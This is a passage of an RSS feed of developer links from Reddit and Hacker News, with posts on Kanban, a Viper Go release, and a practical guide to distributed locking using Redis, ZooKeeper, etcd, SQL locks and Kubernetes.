Nelsen]]></content:encoded></item><item><title>Is there a Nodejs library you wish existed for Golang?</title><link>https://www.reddit.com/r/golang/comments/1jby40e/is_there_a_nodejs_library_you_wish_existed_for/</link><author>/u/prisencotech</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Sat, 15 Mar 2025 15:51:41 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[People often cite the availability of third party libraries for Node as the reason to prefer it over Golang. Has anyone run into a time when they had to use Node or made do without because a third party library didn't exist?   submitted by    /u/prisencotech ]]></content:encoded></item><item><title>Show HN: A personal YouTube frontend based on yt-dlp</title><link>https://github.com/christian-fei/my-yt</link><author>modmodmod</author><category>dev</category><category>hn</category><pubDate>Sat, 15 Mar 2025 15:45:42 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Show HN: Fashion Shopping with Nearest Neighbors</title><link>https://vibewall.shop/</link><author>unixpickle</author><category>dev</category><category>hn</category><pubDate>Sat, 15 Mar 2025 15:33:21 +0000</pubDate><source url="https://news.ycombinator.com/shownew">HN Show</source><content:encoded><![CDATA[An error has occurred while loading the content.]]></content:encoded></item><item><title>Milk Kanban</title><link>https://brodzinski.com/2025/03/milk-kanban.html</link><author>ladronevincet</author><category>dev</category><category>hn</category><pubDate>Sat, 15 Mar 2025 15:32:02 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[When people say Kanban, they tend to think of a specific set of practices. Whiteboards & sticky notes (both almost universally virtual). Tasks moving through columns that represent workflow. Every now and then, WIP limits even.As often as we do it with other things, it reduces a broader principle to a set of oversimplified techniques, which, in turn, tend to underdeliver in many contexts.In its original meaning, Kanban represented a visual signal. The thing that communicated, well, something. It might have been a need, option, availability, capacity, request, etc.In our Kanban systems, the actual Kanban is a sticky note.It represents work, and given its closest environment (board, columns, other stickies, visual decorators), it communicates what needs, or needs not, to be done.If itâ€™s yellow, itâ€™s a regular feature. If thereâ€™s a blocker on it, it requests focus. If thereâ€™s a long queue of neighbors, it suggests flow inefficiency. If itâ€™s a column named â€œready forâ€¦â€ it communicates available work and/or handoff.A visual signal all the way.Letâ€™s decouple ourselves from the most standard Kanban board design. Letâ€™s forget columns, sticky notes, and all that jazz.Enters Kasia, our office manager at Lunar. One of the many things Kasia takes care of is making sure we donâ€™t run out of kitchen supplies. The tricky part is that when you donâ€™t drink milk yourself, it becomes a pain to check the cupboard with milk reserves every now and then to ensure weâ€™re stocked.Then, one day, I found this.A simple index card taped to the last milk carton in a row stating, â€œBring me to Kasia.â€ Thatâ€™s it.In the context, it really says that:weâ€™re running out of (specific kind of) milkthereâ€™s enough time to make an order (we donâ€™t drink that much of cappuccinos and macchiatos)But itâ€™s just a visual signal. Kanban at its very core.What Kasia designed is a perfect Kanban system. It relies on visual signals, which are put in the context. Even better, unlike most Kanban boards I see across teams, the system is self-explanatory. Everything one needs to know is written on the index card.Itâ€™s a safe assumption that, almost always, thereâ€™s a simpler visualization that would work just as well. We, process designers, often fall into the trap of overengineering our tools.And itâ€™s a healthy wake-up call when someone who knows close to nothing about our fancy stuff designs a system that we would unlikely think of. One that is a perfect implementation of the original spirit, even if it doesnâ€™t follow any of the common techniques.Thatâ€™s what we can learn from Milk Kanban.]]></content:encoded></item><item><title>New Viper release with major improvements</title><link>https://www.reddit.com/r/golang/comments/1jbx8d6/new_viper_release_with_major_improvements/</link><author>/u/sagikazarmark</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Sat, 15 Mar 2025 15:11:55 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[It comes with a number of improvements:Heavily reduced number of third-party dependenciesNew encoding layer for custom encoding formatsBREAKING: dropped HCL, INI and Java properties from the core (still possible to use through external libraries)New file search API allows customizing how Viper looks for config filesThese features has been around for some time in alpha releases, though I haven't received a lot of feedback, so I'm posting here now in the hope that people using Viper will give some after upgrading.I worked hard to minimize breaking changes, but it's possible some slipped in. If you find any, feel free to open an issue.]]></content:encoded></item><item><title>Distributed Locking: A Practical Guide</title><link>https://www.architecture-weekly.com/p/distributed-locking-a-practical-guide</link><author>/u/Adventurous-Salt8514</author><category>dev</category><category>reddit</category><pubDate>Sat, 15 Mar 2025 15:10:23 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[Was your data ever mysteriously overwritten? No? Think again. Have you noticed conflicting updates to the same data?In distributed systems, coordination is crucial. A distributed lock ensures that if one actor (node, service instance, etc.) changes a shared resourceâ€”like a database record, file, or external serviceâ€”no other node can step in until the first node is finished.Today, weâ€™ll try to discuss it and:By the end, you should have a decent grasp of distributed locks, enough to make informed decisions about whether (and how) to use them in your architecture.whoâ€™s in charge of updating shared data?For example, you might have:Multiple Writers are updating the same table row.Thatâ€™s a common issue when updating read models.Without locks, you can get unpredictable states - like a read model flipping from correct to incorrect or a file partially overwritten by multiple workers. Locks sacrifice a bit of parallelism for the certainty that no two nodes update the same resource simultaneously. In many cases, thatâ€™s the safest trade-off, especially if data correctness is paramount.idempotent actionswrite-ahead logsIf no lock currently exists, the node creates one, for instance by setting a Redis key with a time-to-live or by creating an ephemeral zNode in ZooKeeper.If another node is holding the lock, this node either waits, fails immediately, or retries, depending on your chosen policy.Crash or Automatic ReleaseThe basic flow would look like:And the acquisition part with TTL handling:There are many tools for distributed locking; let's check the most popular for certain categories.Kubernetes Single-InstanceDistributed locks all share a common goal: ensure only one node does a particular thing at any given time. However, each tool mentioned approaches the problem with distinct designs, strengths, and failover behaviours.Letâ€™s look at each toolâ€™s big-picture purposeâ€”why youâ€™d even consider itâ€”then move on to how it implements (or approximates) a lock. Lastly, letâ€™s discuss a few technical details that matter once you start coding or troubleshooting.Redis runs all commands in a single thread, so there is no risk of two commands interfering partway through.Redis runs all commands in a single thread, so there is no risk of two commands interfering partway through. To create a lock, you need to create a â€œlock keyâ€ using a Redis command, for instance:SET lockKey node123 NX EX 30That looks cryptic, but letâ€™s see whatâ€™s happening behind the scenes:Atomic Key Creation with NX. SET lockKey node123 NX EX 30SET lockKey node123 NX EX 30Handling Network Partitions. Redlock algorithmChoosing Redis may be a good option if you already run a Redis cluster for caching or need a lightweight solution thatâ€™s easy to integrate. Performance is generally good, though absolute consistency under partitions can require more complex setups.ZooKeeper and etcd each run as a cluster of nodes that keep data consistent across a majority of them (a quorum).You create something like  in ZooKeeper or a key in etcd.When youâ€™re done, you delete the ephemeral node or lease key, signalling that source is available.Other clients can â€œwatchâ€ that lock path. If the lock holder crashes, ZooKeeper or etcd detects the session loss and removes the node, instantly notifying watchers that the lock is free again. This allows any waiting client to move in and grab the lock right away.If a node is isolated from the quorum, ZooKeeper or etcd eventually considers that session dead and removes the ephemeral node. This auto-frees the lock. The newly updated cluster state reflects that the lock is available, so another node can pick it up.If your environment already depends on them for cluster metadata or leader election, reusing them for locks is natural. They replicate data across multiple servers, so updates to the lock state are consistent, reducing the risk of split-brain scenarios. The ephemeral mechanism automatically frees locks if a session dies, so you donâ€™t end up with â€œzombieâ€ locks after crashes.They offer stronger consistency guarantees at the cost of heavier operational overhead compared to Redis.Sometimes youâ€™d rather avoid setting up additional infrastructure, like Redis or ZooKeeper, and simply rely on the single relational database you already use. Many SQL databasesâ€”PostgreSQL, MySQL, SQL Server, and othersâ€”provide built-in locking features that can help you coordinate concurrency directly in your existing environment. There are generally two ways to handle locks in a relational database: â€œI want exclusive access to somethingâ€They serve different needs, but both let you say, â€œI want exclusive access to something,â€ using your existing DB.You can lock specific rows in a table by issuing something like:BEGIN;
SELECT * FROM locks WHERE lock_id = @loc_key FOR UPDATE;
/* make changes */
COMMIT;
That looks cryptic, but hereâ€™s whatâ€™s happening. â€œLock this row so nobody else can modify it until Iâ€™m done.â€The lock lasts until you commit or roll back the transaction.You may also use regular rows instead of a dedicated locks table. Itâ€™s natural if your concurrency problem revolves around specific table rows. For others you need to define key that would represent the scope of locking-- PostgreSQL
SELECT pg_advisory_lock(12345);
/* do something exclusive */
SELECT pg_advisory_unlock(12345);
-- MySQL
SELECT GET_LOCK('readModel', 10);
/* do something exclusive */
SELECT RELEASE_LOCK('readModel');
PostgreSQL Advisory LocksIn many cases, database locks require minimal setup. Thereâ€™s no need to spin up Redis or ZooKeeper if you already trust a single relational DB for everything. You can use familiar SQL, which can benefit many developers. You get transaction integrations.Still, theyâ€™re tight to a single database scope.The other downside is lock contention.You also can get deadlocksSometimes, you donâ€™t need a distributed lock at allâ€”you just need to ensure thereâ€™s no possibility of concurrency. In Kubernetes, you can tell the cluster to run exactly one replica of your service. With only one pod, you donâ€™t risk two pods writing to the same resource simultaneously. This approach is straightforward but also very limiting.StatefulSetNo Parallelism or scalingetcdetcdIn Kubernetes, the mechanisms and controllers designed to manage the number of pods are quite robust, but in highly dynamic or unusual situations, there might be brief moments where conditions could lead to more than one pod being created temporarily.Rapid Scale-Up and Scale-Down:Network Partitions or etcd Availability Issues:Why Youâ€™d Choose Single-Instance in Kubernetes?If you just need to enforce that thereâ€™s a single instance processing background job (read model handling, job processing) and you have Kubernetes set up, then itâ€™s a decent choice. You remove the concurrency at all. You donâ€™t spin up Redis or ZooKeeper just to handle locks.Still, the race conditions can be dangerous for high traffic or important cases. Itâ€™s not fully reliable.Hereâ€™s my recommended decision-making scheme for locking mechanism:If you have a single relational DB handling all app state, advisory locks might sufficeIf your environment already includes a Redis cluster for caching and you want a simpler ephemeral lock, Redis is a natural fit.If concurrency is never desired or is completely out of scope for a specific microservice, AND youâ€™re using already Kubernetes a single-instance Kubernetes approach may be acceptable.If your microservices need advanced coordination (like leader election, watchers, or strongly consistent state), consider ZooKeeper or etcd. If your system needs to acquire multiple locks at once, you risk deadlocks (e.g., process A has Lock1 and wants Lock2; process B has Lock2 and wants Lock1). The best practice is to lock in a consistent order globally or use carefully designed transaction boundaries. Iâ€™ll show you next week how you could use queuing and single writer for that.Locks serialize access. If too many services fight for the same lock, your system effectively becomes single-threaded. To avoid bottlenecks, lock only the smallest critical sections. If concurrency at some granularity is acceptable, consider sharding or partitioned locks.If you rely on a single Redis instance or a single ZooKeeper node, your lock manager can fail. Always consider using a clustered or highly available setup, such as Redis with sentinel or cluster mode or a ZooKeeper ensemble of three or five nodes.Systems like Redlock try to handle partial failures, but no distributed lock can be 100% guaranteed if your network is severely partitioned (CAP theorem territory). You might end up with multiple holders, each believing theyâ€™re the only one. Proper design, timeouts, and conflict detection help reduce these edge cases.Try to avoid distributed locking if you can. Distributed systems will always have complexities, but a well-implemented distributed lock (or a strategic single-instance approach) can tame the chaos of concurrencyâ€”keeping your data consistent and your architecture stable.What are your experiences, use cases, and challenges with distributed locking?And hey, all the best for Christmas if you celebrate it. If you donâ€™t, try to also get the chance to rest a bit. And if you  donâ€™t want to, thatâ€™s fine, as long as youâ€™re happy!p.s. Ukraine is still under brutal Russian invasion. A lot of Ukrainian people are hurt, without shelter and need help.Ukraine humanitarian Ambulances for UkraineRed Cross]]></content:encoded></item><item><title>Show HN: Web Audio Spring-Mass Synthesis</title><link>https://blog.cochlea.xyz/string.html</link><author>cochlear</author><category>dev</category><category>hn</category><pubDate>Fri, 14 Mar 2025 21:27:25 +0000</pubDate><source url="https://news.ycombinator.com/shownew">HN Show</source><content:encoded><![CDATA[]]></content:encoded></item></channel></rss>